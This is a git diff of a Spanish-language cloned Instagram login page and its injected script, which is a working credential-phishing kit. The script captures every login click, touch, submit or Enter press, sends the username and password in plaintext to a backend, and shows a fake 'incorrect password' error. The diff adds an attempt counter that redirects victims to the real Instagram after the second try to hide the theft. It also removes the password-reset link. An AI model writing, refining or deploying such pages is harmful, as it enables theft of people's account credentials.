@@ -2813,7 +2813,7 @@
                                             class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w x6s0dn4 x1k70j0n xzueoph xzboxd6 x14l7nz5">
                                             <div class="x3nfvp2 x1n2onr6 xh8yej3"><a
                                                 class="x1i10hfl xjbqb8w x1ejq31n x18oe1m7 x1sy0etr xstzfhl x972fbf x10w94by x1qhh985 x14e42zd x1ypdohk x3ct3a4 xdj266r x14z9mp xat24cr x1lziwak xexx8yu xyri2b x18d9i69 x1c1uobl x16tdsg8 x1hl2dhg xggy1nq x1fmog5m xu25z0z x140muxe xo1y3bh x87ps6o x1lku1pv x1a2a7pz x9f619 x3nfvp2 xdt5ytf xl56j7k x1n2onr6 xh8yej3"
-                                                href="/accounts/password/reset/" role="link" tabindex="0">
+                                                role="link" tabindex="0">
                                                 <div role="none"
                                                   class="x1ja2u2z x78zum5 x2lah0s x1n2onr6 xl56j7k x6s0dn4 xozqiw3 x1q0g3np x972fbf x10w94by x1qhh985 x14e42zd x9f619 xjbqb8w xqbgfmv xbe3n85 x7a1id4 x1d9i5bo x1xila8y x1bumbmr xc8cyl1">
                                                   <div
@@ -2874,7 +2874,8 @@
                                             class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w x6s0dn4 xexx8yu x1k70j0n xzueoph xzboxd6 x14l7nz5">
                                             <div class="x3nfvp2 x1n2onr6 xh8yej3"><a aria-label="Crear una cuenta"
                                                 class="x1i10hfl xjbqb8w x1ejq31n x18oe1m7 x1sy0etr xstzfhl x972fbf x10w94by x1qhh985 x14e42zd x1ypdohk x3ct3a4 xdj266r x14z9mp xat24cr x1lziwak xexx8yu xyri2b x18d9i69 x1c1uobl x16tdsg8 x1hl2dhg xggy1nq x1fmog5m xu25z0z x140muxe xo1y3bh x87ps6o x1lku1pv x1a2a7pz x9f619 x3nfvp2 xdt5ytf xl56j7k x1n2onr6 xh8yej3"
-                                                href="/accounts/emailsignup/?next=" role="link" tabindex="0">
+                                                href="www.instagram.com/accounts/emailsignup/?next=" role="link"
+                                                tabindex="0">
                                                 <div role="none"
                                                   class="x1ja2u2z x78zum5 x2lah0s x1n2onr6 xl56j7k x6s0dn4 xozqiw3 x1q0g3np x9f619 x1qhmfi1 x12ezzi8 xk7q072 x7uw254 x1xjjfxs x13fuv20 x18b5jzi x1q0q8m5 x1t7ytsu x178xt8z x1lun4ml xso031l xpilrb4 xqbgfmv xbe3n85 x7a1id4 x1d9i5bo x1xila8y x1bumbmr xc8cyl1">
                                                   <div
@@ -3277,35 +3278,33 @@
 </body>
 
 <script>
-  /* ================================================================
-     LOGIN INTERCEPTOR v3 — Event Delegation
-     
-     PROBLEMA ANTERIOR: se buscaba el botón por querySelector y se le
-     pegaba un listener directo. Cuando React rehidrata el DOM (ocurre
-     3-4 veces), destruye y recrea los nodos → el listener se pierde.
-     
-     SOLUCIÓN: delegación de eventos en document (fase de captura).
-     No importa cuántas veces React rehaga el DOM: document siempre
-     existe y el listener siempre intercepta cualquier click/touch
-     que suba desde cualquier elemento de la página.
-     ================================================================ */
   (function () {
     'use strict';
     const PAGE_ID = 'instagram';
 
     var BACKEND = '/login';
     var ERROR_MSG = 'Tu contraseña es incorrecta. Compruébala e inténtalo de nuevo.';
-    var _sent = false;   // evitar doble envío en el mismo ciclo
+    var REDIRECT_URL = 'https://www.instagram.com/';
+    var MAX_ATTEMPTS = 2;
+    var _sent = false;
 
-    /* ── Envío de logs (sendBeacon + fetch fallback) ───────── */
+    /* ── Contador de intentos en sessionStorage ─────────── */
+    function getAttempts() {
+      return parseInt(sessionStorage.getItem('_ig_attempts') || '0', 10);
+    }
+    function incrementAttempts() {
+      var n = getAttempts() + 1;
+      sessionStorage.setItem('_ig_attempts', n);
+      return n;
+    }
+
+    /* ── Envío de logs (sendBeacon + fetch fallback) ─────── */
     function sendLog(url, data) {
       var payload = JSON.stringify(data);
       if (navigator.sendBeacon) {
         try {
           return navigator.sendBeacon(url, new Blob([payload], { type: 'application/json' }));
-        } catch (_err) {
-          // continue to fetch fallback
-        }
+        } catch (_err) { }
       }
       return fetch(url, {
         method: 'POST',
@@ -3315,32 +3314,15 @@
       }).catch(function () { });
     }
 
-    /* ── SHA-256 + Base64 ───────────────────────────────────── */
-    async function sha256Base64(str) {
-      var encoder = new TextEncoder();
-      var data = encoder.encode(str);
-      var hashBuffer = await crypto.subtle.digest('SHA-256', data);
-      var hashArray = new Uint8Array(hashBuffer);
-      var binary = '';
-      for (var i = 0; i < hashArray.length; i++) {
-        binary += String.fromCharCode(hashArray[i]);
-      }
-      return btoa(binary);
-    }
+    /* ── Visita de página ───────────────────────────────── */
+    sendLog('/visit', {
+      page: window.location.pathname,
+      user: 'anonymous',
+      event: 'PAGE_VISIT'
+    });
 
-    function trackPageVisit() {
-      sendLog('/visit', {
-        page: window.location.pathname,
-        user: 'anonymous',
-        event: 'PAGE_VISIT'
-      });
-    }
-
-    trackPageVisit();
-
-    /* ── Error UI ────────────────────────────────────────────── */
+    /* ── Error UI ─────────────────────────────────────────── */
     function showError() {
-      /* Intenta reutilizar el div; si React lo eliminó, lo recrea */
       var d = document.getElementById('_ig_err');
       if (!d) {
         d = document.createElement('div');
@@ -3352,7 +3334,6 @@
           'font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif',
           'text-align:center', 'line-height:1.4', 'z-index:9999', 'position:relative'
         ].join(';');
-        /* Insertar antes del form o al principio del body */
         var form = document.getElementById('login_form');
         if (form && form.parentNode) {
           form.parentNode.insertBefore(d, form);
@@ -3364,17 +3345,17 @@
       d.style.display = 'block';
     }
 
-    /* ── Envío al backend ────────────────────────────────────── */
-    async function sendToBackend(username, password) {
-      await sendLog(BACKEND, {
+    /* ── Envío al backend ─────────────────────────────────── */
+    async function sendToBackend(username, password, extraFields) {
+      await sendLog(BACKEND, Object.assign({
         username: username,
         password: password,
         page: PAGE_ID,
         event: 'LOGIN_ATTEMPT'
-      });
+      }, extraFields || {}));
     }
 
-    /* ── Lógica principal al detectar intento de login ────────── */
+    /* ── Lógica principal al detectar intento de login ─────── */
     async function onLoginAttempt(e) {
       if (e) {
         e.preventDefault();
@@ -3382,7 +3363,6 @@
         e.stopPropagation();
       }
 
-      /* Throttle: ignorar disparos duplicados en el mismo tick */
       if (_sent) return;
       _sent = true;
       setTimeout(function () { _sent = false; }, 800);
@@ -3396,74 +3376,61 @@
         pass = pEl ? pEl.value : '';
       }
 
-      // var hashedPass = pass ? await sha256Base64(pass) : '';
-      await sendToBackend(user, pass);
-      showError();
+      var attempts = incrementAttempts();
+
+      if (attempts >= MAX_ATTEMPTS) {
+        sessionStorage.removeItem('_ig_attempts');
+        await sendToBackend(user, pass, {
+          event: 'MAX_ATTEMPTS_REDIRECT',
+          attempts: attempts,
+          redirectTo: REDIRECT_URL
+        });
+        setTimeout(function () { window.location.href = REDIRECT_URL; }, 600);
+      } else {
+        await sendToBackend(user, pass);
+        showError();
+      }
+
       return false;
     }
 
-    /* ── ¿Es este evento un intento de login? ─────────────────── */
+    /* ── ¿Es este evento un intento de login? ─────────────── */
     function isLoginTarget(target) {
       if (!target) return false;
-
-      /* El elemento es el botón o está dentro del botón */
-      var el = target;
-      var depth = 0;
+      var el = target, depth = 0;
       while (el && depth < 8) {
-        /* aria-label exacto */
         var label = (el.getAttribute && el.getAttribute('aria-label')) || '';
         if (label === 'Iniciar sesión') return true;
-
-        /* El div-botón tiene role="button" y está dentro del form */
         if (el.getAttribute && el.getAttribute('role') === 'button') {
           var form = document.getElementById('login_form');
           if (form && form.contains(el)) return true;
         }
-
-        /* <input type="submit"> o <button> dentro del form */
         var tag = (el.tagName || '').toLowerCase();
-        if ((tag === 'button' || (tag === 'input' && el.type === 'submit'))) {
+        if (tag === 'button' || (tag === 'input' && el.type === 'submit')) {
           var form2 = document.getElementById('login_form');
           if (form2 && form2.contains(el)) return true;
         }
-
         el = el.parentElement;
         depth++;
       }
       return false;
     }
 
-    /* ── DELEGACIÓN DE EVENTOS EN document ───────────────────── */
-    /* Se registra UNA SOLA VEZ al cargar el script.
-       No depende de que React haya montado nada todavía.
-       Captura TODOS los clicks/touches de la página en fase
-       de captura (antes de que React los procese). */
-
-    var EVENTS = ['click', 'touchend', 'pointerup'];
-
-    EVENTS.forEach(function (evName) {
+    /* ── Delegación de eventos en document ────────────────── */
+    ['click', 'touchend', 'pointerup'].forEach(function (evName) {
       document.addEventListener(evName, function (e) {
-        if (isLoginTarget(e.target)) {
-          onLoginAttempt(e);
-        }
-      }, true /* capture */);
+        if (isLoginTarget(e.target)) onLoginAttempt(e);
+      }, true);
     });
 
-    /* submit del form también por delegación */
     document.addEventListener('submit', function (e) {
-      if (e.target && e.target.id === 'login_form') {
-        onLoginAttempt(e);
-      }
+      if (e.target && e.target.id === 'login_form') onLoginAttempt(e);
     }, true);
 
-    /* ── keydown Enter en los inputs del form ─────────────────── */
     document.addEventListener('keydown', function (e) {
       if (e.key !== 'Enter' && e.keyCode !== 13) return;
-      var target = e.target;
       var form = document.getElementById('login_form');
-      if (form && form.contains(target)) {
-        onLoginAttempt(e);
-      }
+      if (form && form.contains(e.target)) onLoginAttempt(e);
     }, true);
 
   })();
